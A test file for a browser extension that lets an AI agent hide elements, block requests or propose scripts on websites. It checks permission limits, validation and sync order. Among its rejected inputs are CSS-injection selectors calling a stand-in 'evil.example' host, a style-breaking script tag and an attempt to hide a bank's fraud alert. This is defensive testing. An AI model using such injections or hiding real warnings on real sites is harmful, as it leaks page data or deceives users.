// Site edits: what an agent may change on a site, and that the browser follows it. A script runs with the user's sign-in on
// every visit, so only the person turns one on; hide stays CSS that can only hide; block stays on its own site.
import assert from "node:assert/strict";
import { test } from "node:test";
import { installFakeChrome } from "./fake-chrome.mjs";

const store = await import("../src/site-edits/store.ts");
const empty = { edits: [], adBlock: false };

test("a site is a plain host, written one way", () => {
	assert.equal(store.normalizeHost("https://www.X.com/home"), "x.com");
	assert.equal(store.normalizeHost("news.example.co.uk."), "news.example.co.uk");
	for (const bad of ["", "localhost", "x", "javascript:alert(1)", "a b.com"]) assert.throws(() => store.normalizeHost(bad), store.SiteEditError, bad);
	assert.ok(store.onHost("https://m.x.com/a", "x.com"));
	assert.ok(!store.onHost("https://notx.com/a", "x.com"));
	assert.ok(!store.onHost("chrome://settings", "settings"));
});

test("hide takes selectors only, so an edit can't add CSS that reads the page", () => {
	assert.equal(store.checkSelectors(" .ad, [data-testid=sidebar] "), ".ad, [data-testid=sidebar]");
	for (const bad of [
		".a { display:block }",
		"input[value^=a] ~ x; background: url(https://evil.example/a)",
		"@import url(https://evil.example/x.css)",
		".a\\7b",
		"</style><script>",
		"",
	]) {
		assert.throws(() => store.checkSelectors(bad), store.SiteEditError, bad);
	}
	const s = store.added(empty, { host: "x.com", kind: "hide", value: ".ad", actor: "agent", who: "claude" }, "a1", 1).state;
	assert.equal(store.hideCss(s, "https://x.com/home"), ".ad { display: none !important; }");
	assert.equal(store.hideCss(s, "https://example.com/"), "", "only on its own site");
});

test("block never stops the page itself or works off its own site, and can't block everything", () => {
	const s = store.added(empty, { host: "news.example.com", kind: "block", value: "||ads.example.net^", actor: "agent", who: "c" }, "b1", 1).state;
	const [rule] = store.blockRules(s, 50000);
	assert.equal(rule.id, 50000);
	assert.deepEqual(rule.condition.initiatorDomains, ["news.example.com"]);
	assert.ok(!rule.condition.resourceTypes.includes("main_frame"));
	for (const bad of ["*", "||^", "|", "a b"]) assert.throws(() => store.checkPattern(bad), store.SiteEditError, bad);
});

test("an agent's script starts off, and only the person turns it on", () => {
	let s = store.added(empty, { host: "x.com", kind: "script", value: "document.title='x'", note: "rename", actor: "agent", who: "claude" }, "s1", 1).state;
	assert.equal(s.edits[0].on, false);
	assert.equal(s.edits[0].addedBy, "agent:claude");
	assert.throws(() => store.switched(s, "s1", true, "agent"), /Only the person/);
	s = store.switched(s, "s1", true, "person");
	assert.equal(s.edits[0].on, true);
	// An agent may always turn one off.
	assert.equal(store.switched(s, "s1", false, "agent").edits[0].on, false);
	// Hide and block from an agent are on at once: each is one click to undo.
	const h = store.added(empty, { host: "x.com", kind: "hide", value: ".a", actor: "agent", who: "c" }, "h1", 1);
	assert.equal(h.edit.on, true);
});

test("one selector the browser can't read never switches off the other hides on the site", () => {
	let s = store.added(empty, { host: "x.com", kind: "hide", value: ".ad", actor: "agent", who: "c" }, "1", 1).state;
	s = store.added(s, { host: "x.com", kind: "hide", value: ".post:contains(Promoted)", actor: "agent", who: "c" }, "2", 2).state;
	assert.equal(store.hideCss(s, "https://x.com/"), ".ad { display: none !important; }\n.post:contains(Promoted) { display: none !important; }");
});

test("a pattern the browser would refuse is refused here, since one bad rule stops every block", () => {
	for (const bad of ["/werbung-ü/", "foo||bar"]) assert.throws(() => store.checkPattern(bad), store.SiteEditError, bad);
	assert.equal(store.checkPattern("||ads.example.com^"), "||ads.example.com^");
});

test("an agent can't edit a site it may not open: the same check as opening it runs first", async () => {
	installFakeChrome();
	globalThis.chrome.runtime = { ...(globalThis.chrome.runtime ?? {}), getManifest: () => ({ version: "0" }) };
	const { handlers } = await import(`../src/bridge/tools.ts?ctx=${Math.random()}`);
	const asked = [];
	const ctx = {
		session: { groupName: "claude" },
		clientId: "c1",
		isGuarded: () => false,
		checkUrl: async (url) => {
			asked.push(url);
			throw new Error("Not allowed to open mybank.com");
		},
	};
	await assert.rejects(handlers["edits.add"](ctx, { kind: "hide", host: "mybank.com", value: ".fraud-alert" }), /Not allowed/);
	assert.deepEqual(asked, ["https://mybank.com/"]);
	assert.deepEqual((await store.load()).edits, [], "nothing stored");
	const guarded = { ...ctx, isGuarded: () => true };
	await assert.rejects(handlers["edits.add"](guarded, { kind: "hide", host: "polycarp.example", value: ".a" }), /never open/);
	const allowed = { ...ctx, checkUrl: async () => undefined };
	const r = await handlers["edits.add"](allowed, { kind: "hide", host: "x.com", value: ".ad" });
	assert.equal(r.edit.addedBy, "agent:claude");
});

test("syncs never run side by side, so a script turned off can't come back", async () => {
	installFakeChrome();
	const scripts = new Map();
	let gate;
	globalThis.chrome.userScripts = {
		async execute() {
			return [];
		},
		async getScripts() {
			return [...scripts.values()];
		},
		async register(list) {
			// The first run waits here, after reading storage, while the person turns the script off.
			if (gate) await gate;
			for (const s of list) scripts.set(s.id, s);
		},
		async unregister({ ids }) {
			for (const id of ids) scripts.delete(id);
		},
	};
	globalThis.chrome.webNavigation.getAllFrames = async () => [];
	const apply = await import(`../src/site-edits/apply.ts?ctx=${Math.random()}`);
	const s1 = store.added(empty, { host: "x.com", kind: "script", value: "1", actor: "person", who: "you" }, "s1", 1).state;
	await store.change(() => ({ state: s1, result: undefined }));
	let open;
	gate = new Promise((r) => {
		open = r;
	});
	const first = apply.syncSiteEdits();
	await new Promise((r) => setTimeout(r, 20));
	await store.change((s) => ({ state: store.switched(s, "s1", false, "person"), result: undefined }));
	const second = apply.syncSiteEdits();
	// Let a second run finish if it can, before the first one goes on: the order that left a script registered.
	await Promise.race([second, new Promise((r) => setTimeout(r, 60))]);
	gate = undefined;
	open();
	await Promise.all([first, second]);
	assert.equal(scripts.size, 0, "the last run read the person's off and left nothing registered");
});

test("a site shared by many others is refused, and so is a parent of a guarded site", () => {
	// From the Public Suffix List, both sections: the list's own entries, a wildcard rule (*.ck) and private suffixes.
	for (const shared of ["github.io", "co.uk", "com.au", "vercel.app", "uk.com", "surge.sh", "blogspot.com", "anything.kawasaki.jp", "kawasaki.jp", "sch.uk", "nom.br", "amazonaws.com", "windows.net", "xn--55qx5d.cn", "https://\u516c\u53f8.cn/"]) {
		assert.throws(() => store.normalizeHost(shared), /shared by many sites/, shared);
	}
	assert.equal(store.normalizeHost("city.kawasaki.jp"), "city.kawasaki.jp", "an exception to a wildcard rule is a site");
	for (const site of ["someone.github.io", "bbc.co.uk", "x.com", "example.uk.com"]) assert.equal(store.normalizeHost(site), site);
	assert.equal(store.guardedUnder("example.com", ["login.example.com:443"]), "login.example.com");
	assert.equal(store.guardedUnder("example.com", ["example.org"]), undefined);
});

test("an agent allowed on a site can't reach a guarded site under it", async () => {
	installFakeChrome();
	globalThis.chrome.runtime = { ...(globalThis.chrome.runtime ?? {}), getManifest: () => ({ version: "0" }) };
	const { handlers } = await import(`../src/bridge/tools.ts?ctx=${Math.random()}`);
	const ctx = {
		session: { groupName: "claude" },
		clientId: "c1",
		guardedHosts: ["approve.example.com"],
		isGuarded: (url) => new URL(url).hostname === "approve.example.com",
		checkUrl: async () => undefined,
	};
	await assert.rejects(handlers["edits.add"](ctx, { kind: "hide", host: "example.com", value: ".a" }), /would reach approve\.example\.com/);
	assert.deepEqual((await store.load()).edits, []);
});

test("selectors that would run into the next rule, and patterns that block everything, are refused", () => {
	for (const bad of ["/*", ".a /*", ".a:not(.b", '[data-x="y', ".a)"]) assert.throws(() => store.checkSelectors(bad), store.SiteEditError, bad);
	assert.equal(store.checkSelectors('a[href*="ad"]:not(.keep)'), 'a[href*="ad"]:not(.keep)');
	for (const bad of ["https://", "|https:", "||*ads", "||*.doubleclick.net^", "wss://*", "*http", "|http*", "https*://", "|htt", "h*t*t*p*", "||*"]) {
		assert.throws(() => store.checkPattern(bad), /block everything/, bad);
	}
	assert.throws(() => store.checkSelectors('[data-x="\n"]'), /one line/);
});

test("the same edit twice is one edit, and there is a limit", () => {
	const once = store.added(empty, { host: "x.com", kind: "hide", value: ".a", actor: "agent", who: "c" }, "1", 1).state;
	assert.equal(store.added(once, { host: "www.x.com", kind: "hide", value: ".a", actor: "agent", who: "c" }, "2", 2).state.edits.length, 1);
	const full = { edits: Array.from({ length: store.MAX_EDITS }, (_, i) => ({ id: String(i) })), adBlock: false };
	assert.throws(() => store.added(full, { host: "x.com", kind: "hide", value: ".a", actor: "agent", who: "c" }, "z", 1), /already/);
});

test("the browser follows the edits: rules, ad blocking, sheets and scripts", async () => {
	const fake = installFakeChrome();
	const dynamic = new Map();
	const rulesets = new Set();
	const sheets = [];
	const scripts = new Map();
	Object.assign(globalThis.chrome, {
		declarativeNetRequest: {
			async getDynamicRules() {
				return [...dynamic.values()];
			},
			async updateDynamicRules({ removeRuleIds = [], addRules = [] }) {
				for (const id of removeRuleIds) dynamic.delete(id);
				for (const r of addRules) dynamic.set(r.id, r);
			},
			async getEnabledRulesets() {
				return [...rulesets];
			},
			async updateEnabledRulesets({ enableRulesetIds = [], disableRulesetIds = [] }) {
				for (const id of enableRulesetIds) rulesets.add(id);
				for (const id of disableRulesetIds) rulesets.delete(id);
			},
		},
		scripting: {
			async insertCSS(o) {
				sheets.push(["in", o.target.tabId, o.css]);
			},
			async removeCSS(o) {
				sheets.push(["out", o.target.tabId, o.css]);
			},
		},
		userScripts: {
			async execute() {
				return [];
			},
			async getScripts() {
				return [...scripts.values()];
			},
			async register(list) {
				for (const s of list) scripts.set(s.id, s);
			},
			async unregister({ ids }) {
				for (const id of ids) scripts.delete(id);
			},
		},
		permissions: { ...globalThis.chrome.permissions, onAdded: { addListener() {} } },
	});
	globalThis.chrome.webNavigation.getAllFrames = async ({ tabId }) => [{ frameId: 0, url: (await globalThis.chrome.tabs.get(tabId)).url }];
	// A rule of someone else's (the custom-provider CORS rules) is left alone.
	dynamic.set(2000, { id: 2000 });
	const tab = fake.addTab({ url: "https://x.com/home" });
	const apply = await import(`../src/site-edits/apply.ts?ctx=${Math.random()}`);
	const add = (input) => store.change((s) => {
		const r = store.added(s, input, store.newId(), Date.now());
		return { state: r.state, result: r.edit };
	});
	await add({ host: "x.com", kind: "hide", value: ".ad", actor: "agent", who: "c" });
	await add({ host: "x.com", kind: "block", value: "||ads.example.net^", actor: "agent", who: "c" });
	const script = await add({ host: "x.com", kind: "script", value: "1", actor: "agent", who: "c" });
	await store.change((s) => ({ state: { ...s, adBlock: true }, result: undefined }));
	await apply.syncSiteEdits();
	assert.ok(dynamic.has(2000), "someone else's rule stays");
	assert.ok(dynamic.has(apply.SITE_RULE_BASE));
	assert.ok(rulesets.has("ads"));
	assert.deepEqual(sheets.at(-1), ["in", tab, ".ad { display: none !important; }"]);
	assert.equal(scripts.size, 0, "a script waiting for the person never runs");
	await store.change((s) => ({ state: store.switched(s, script.id, true, "person"), result: undefined }));
	await apply.syncSiteEdits();
	assert.deepEqual(scripts.get(`site-edit-${script.id}`).matches, ["*://x.com/*", "*://*.x.com/*"]);
	await store.change((s) => ({ state: { edits: [], adBlock: false }, result: undefined }));
	await apply.syncSiteEdits();
	assert.equal(scripts.size, 0);
	assert.ok(!rulesets.has("ads"));
	assert.ok(!dynamic.has(apply.SITE_RULE_BASE));
	assert.deepEqual(sheets.at(-1), ["out", tab, ".ad { display: none !important; }"], "taking an edit back takes its sheet out of open tabs");
});
